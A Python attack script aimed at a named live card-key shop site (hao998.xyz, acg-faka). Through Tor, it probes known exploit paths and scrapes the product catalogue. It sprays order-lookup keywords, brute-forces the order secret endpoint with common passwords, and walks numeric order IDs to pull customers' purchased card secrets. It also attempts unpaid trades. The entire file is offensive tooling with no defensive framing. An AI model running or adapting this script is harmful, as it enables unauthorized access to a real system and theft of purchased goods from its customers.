#!/usr/bin/env python3
"""hao998.xyz ACG-faka (简单发卡) SUCCESS_CASES + stack-specific probe."""
import json
import re
import subprocess
import time
from pathlib import Path

OUT = Path("/data/recon/hao998")
(OUT / "dump").mkdir(parents=True, exist_ok=True)
(OUT / "probe").mkdir(parents=True, exist_ok=True)

B = "https://hao998.xyz"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
PX = "socks5h://127.0.0.1:9050"


def log(*a):
    print(*a, flush=True)


def curl(url, data=None, method=None, headers=None, timeout=22):
    cmd = [
        "curl", "-sS", "-m", str(timeout), "-L",
        "-x", PX, "-A", UA, "-k",
        "-H", f"Origin: {B}",
        "-H", f"Referer: {B}/",
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Accept: application/json, text/plain, */*",
    ]
    if headers:
        for h in headers:
            cmd += ["-H", h]
    if data is not None:
        cmd += ["-H", "Content-Type: application/x-www-form-urlencoded", "--data", data]
        if method:
            cmd += ["-X", method]
    elif method:
        cmd += ["-X", method]
    cmd.append(url)
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 8)
    return (p.stdout or "") + (("\n" + p.stderr) if p.returncode and not p.stdout else "")


def jload(s):
    try:
        return json.loads(s)
    except Exception:
        return None


def main():
    findings = {
        "target": B,
        "stack": "acg-faka / 简单发卡网",
        "version_hint": "1.4.3",
        "success_cases": {},
        "interesting": [],
        "kami_obtained": False,
        "kami": [],
    }

    # --- Rainbow / YKFAKA SUCCESS_CASES (expect N/A) ---
    for label, path in [
        ("rainbow_getcount", "/shop/ajax.php?act=getcount"),
        ("rainbow_ajax_query", "/shop/ajax.php?act=query&page=1"),
        ("rainbow_api61_search", "/%61pi.php?act=search&id=1"),
        ("rainbow_api61_tools", "/%61pi.php?act=tools&key="),
        ("yk_null", "/index.php?m=Home&c=Order&a=query"),
    ]:
        if label == "yk_null":
            body = curl(B + path, data="value=null")
        else:
            body = curl(B + path)
        findings["success_cases"][label] = body[:220]
        log("SC", label, body[:160].replace("\n", " "))

    # --- site info ---
    body = curl(B + "/user/api/site/info")
    findings["site_info"] = jload(body) or body[:400]
    log("site_info", body[:300])

    # --- categories + goods ---
    cats = jload(curl(B + "/user/api/index/data")) or {}
    (OUT / "dump" / "categories.json").write_text(
        json.dumps(cats, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    goods = []
    for c in cats.get("data") or []:
        cid = c.get("id")
        j = jload(curl(B + f"/user/api/index/commodity?categoryId={cid}")) or {}
        data = j.get("data") or []
        if isinstance(data, dict):
            data = data.get("list") or []
        for g in data:
            g["_category"] = c.get("name")
            goods.append(g)
        time.sleep(0.05)
    (OUT / "dump" / "goods_all.json").write_text(
        json.dumps(goods, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("goods", len(goods))

    # --- draft card preselect (possible leak) ---
    card_hits = []
    for g in goods:
        gid = g.get("id")
        for page in [1, 2]:
            body = curl(B + f"/user/api/index/card?commodityId={gid}&page={page}&race=")
            j = jload(body)
            log("card", gid, g.get("name"), "p", page, (body[:220] if body else "").replace("\n", " "))
            if isinstance(j, dict) and j.get("code") == 200 and j.get("data"):
                card_hits.append({"commodityId": gid, "name": g.get("name"), "page": page, "resp": j})
                # look for secret-like fields
                blob = json.dumps(j, ensure_ascii=False)
                if any(k in blob for k in ["secret", "card", "password", "kami", "账号", "密码", "@"]):
                    findings["interesting"].append(f"card_leak_commodity_{gid}")
            if not (isinstance(j, dict) and j.get("data")):
                break
            time.sleep(0.05)
    (OUT / "dump" / "card_hits.json").write_text(
        json.dumps(card_hits, ensure_ascii=False, indent=2), encoding="utf-8"
    )

    # --- commodityDetail ---
    details = []
    for g in goods[:8]:
        body = curl(B + f"/user/api/index/commodityDetail?commodityId={g.get('id')}")
        j = jload(body)
        log("detail", g.get("id"), body[:200].replace("\n", " "))
        if j:
            details.append(j)
    (OUT / "dump" / "details_sample.json").write_text(
        json.dumps(details, ensure_ascii=False, indent=2), encoding="utf-8"
    )

    # --- order query keywords spray ---
    query_hits = []
    keywords = [
        "1", "2", "10", "100", "1000",
        "hao998", "admin", "test", "123456",
        "2025", "2026", "0001", "A",
    ]
    # also try recent-looking tradeNo patterns if site_info hints
    for kw in keywords:
        body = curl(B + "/user/api/index/query", data=f"keywords={kw}")
        j = jload(body)
        log("query", repr(kw), body[:240].replace("\n", " "))
        row = {"keywords": kw, "body": body[:500], "json": j}
        query_hits.append(row)
        if isinstance(j, dict) and j.get("code") == 200 and j.get("data"):
            findings["interesting"].append(f"query_hit_{kw}")
            # try secret with empty / common passwords
            data = j["data"]
            orders = data if isinstance(data, list) else [data]
            if isinstance(data, dict) and "list" in data:
                orders = data["list"]
            for od in orders[:20]:
                if not isinstance(od, dict):
                    continue
                oid = od.get("id") or od.get("orderId") or od.get("trade_no") or od.get("tradeNo")
                for pw in ["", "123456", "admin", "000000", "888888", "password"]:
                    sb = curl(
                        B + "/user/api/index/secret",
                        data=f"orderId={oid}&password={pw}",
                    )
                    sj = jload(sb)
                    log("secret", oid, repr(pw), sb[:220].replace("\n", " "))
                    if isinstance(sj, dict) and sj.get("code") == 200 and sj.get("data"):
                        findings["kami_obtained"] = True
                        findings["kami"].append({"orderId": oid, "password": pw, "data": sj["data"]})
                        findings["interesting"].append(f"secret_ok_{oid}")
        time.sleep(0.08)
    (OUT / "dump" / "query_hits.json").write_text(
        json.dumps(query_hits, ensure_ascii=False, indent=2), encoding="utf-8"
    )

    # --- secret IDOR spray on numeric orderId ---
    secret_spray = []
    for oid in list(range(1, 31)) + [50, 100, 200, 500, 1000]:
        for pw in ["", "123456"]:
            body = curl(B + "/user/api/index/secret", data=f"orderId={oid}&password={pw}")
            j = jload(body)
            msg = (j or {}).get("msg") if isinstance(j, dict) else body[:80]
            log("secret_id", oid, repr(pw), msg)
            secret_spray.append({"orderId": oid, "password": pw, "body": body[:300], "json": j})
            if isinstance(j, dict) and j.get("code") == 200 and j.get("data"):
                findings["kami_obtained"] = True
                findings["kami"].append({"orderId": oid, "password": pw, "data": j["data"]})
                findings["interesting"].append(f"secret_idor_{oid}")
            time.sleep(0.05)
    (OUT / "dump" / "secret_spray.json").write_text(
        json.dumps(secret_spray, ensure_ascii=False, indent=2), encoding="utf-8"
    )

    # --- purchaseRecord HTML IDOR ---
    for tn in ["1", "100", "test", "2025080410000000000"]:
        body = curl(B + f"/user/personal/purchaseRecord?tradeNo={tn}")
        hits = re.findall(r"卡密|secret|password|账号|订单|没有|登录|tradeNo", body or "")
        log("purchaseRecord", tn, "len", len(body or ""), "hits", hits[:12])

    # --- pay methods ---
    body = curl(B + "/user/api/index/pay")
    findings["pay"] = jload(body) or body[:300]
    log("pay", body[:250])

    # --- unpaid trade probe (cheap item) ---
    # pick cheapest in-stock
    cheap = None
    for g in sorted(goods, key=lambda x: float(x.get("price") or 999)):
        inv = g.get("card_count") or g.get("stock") or g.get("inventory")
        if inv is None or (isinstance(inv, (int, float)) and inv > 0) or (isinstance(inv, str) and inv.isdigit() and int(inv) > 0):
            # inventory may be in separate field from earlier listing
            cheap = g
            break
    trade_probe = None
    if cheap:
        # minimal trade payload common to acg-faka
        for payload in [
            f"commodity_id={cheap['id']}&num=1&pay_id=1&device=0&password=&coupon=&race=&contact=test@test.com",
            f"commodityId={cheap['id']}&num=1&payId=1&device=0&password=&coupon=&race=&contact=test@test.com",
            f"commodity_id={cheap['id']}&num=1&pay_id=1&device=0&contact=13800138000",
        ]:
            body = curl(B + "/user/api/order/trade", data=payload)
            log("trade", cheap.get("id"), cheap.get("name"), body[:260].replace("\n", " "))
            trade_probe = {"commodity": cheap, "payload": payload, "body": body[:800], "json": jload(body)}
            j = jload(body)
            if isinstance(j, dict) and j.get("code") == 200:
                findings["interesting"].append("unpaid_trade_ok")
                break
            time.sleep(0.1)
    findings["trade_probe"] = trade_probe

    (OUT / "dump" / "FINDINGS_RAW.json").write_text(
        json.dumps(findings, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("INTERESTING", findings["interesting"])
    log("KAMI", findings["kami_obtained"], "n", len(findings["kami"]))
    log("DONE")


if __name__ == "__main__":
    main()
